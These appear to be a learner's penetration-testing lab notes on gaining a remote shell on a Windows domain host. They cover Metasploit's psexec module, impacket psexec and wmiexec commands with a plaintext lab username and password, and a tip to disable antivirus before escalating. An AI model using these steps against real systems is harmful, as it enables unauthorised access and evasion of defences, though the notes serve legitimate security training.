**Gaining Shell**
<br/>
We have a username and password<br/>
<br/>
lets get shell<br/>
<br/>
lhowlete<br/>
Password1<br/>
<br/>
loud method<br/>
<br/>
msfconsole<br/>
<br/>
serach psexec<br/>
<br/>
exploit/windows/smb/psexec <br/>
<br/>
set RHOSTS &lt;ip&gt;<br/>
set SMBDomain &lt;domain&gt;<br/>
set smbpass &lt;password&gt;<br/>
set smbuser &lt;user&gt;<br/>
set lhost &lt;port (eth0)&gt;<br/>
good to adjust payload<br/>
<br/>
<br/>
didnt run &gt; run twice<br/>
<br/>
<img height="200" src="image.png" width="786"/><br/>
<br/>
show targets<br/>
<br/>
try another target<br/>
<br/>
<img src="image 2.png"/><br/>
<br/>
<br/>
also fixed some errors &gt; ran<br/>
<br/>
detected by windows defender<br/>
<br/>
<img height="150" src="image 3.png" width="701"/><br/>
<br/>
Thats ok<br/>
<br/>
<br/>
TRY ALTERNATES<br/>
<br/>
psexec.py marvel.local/lhowlette:Password1@192.168.247.135<br/>
<br/>
Changes from course material<br/>
<br/>
impacket-psexec marvel.local/lhowlette:Password1@192.168.247.135<br/>
<br/>
ALSO detected!<br/>
<br/>
Try something else<br/>
<br/>
impacket-wmiexec marvel.local/lhowlette:Password1@192.168.247.135 <br/>
<br/>
protip &gt; start with psexec or wmiexec... create a half shell look around try and disable AV then use metaspoit<br/>
<br/>
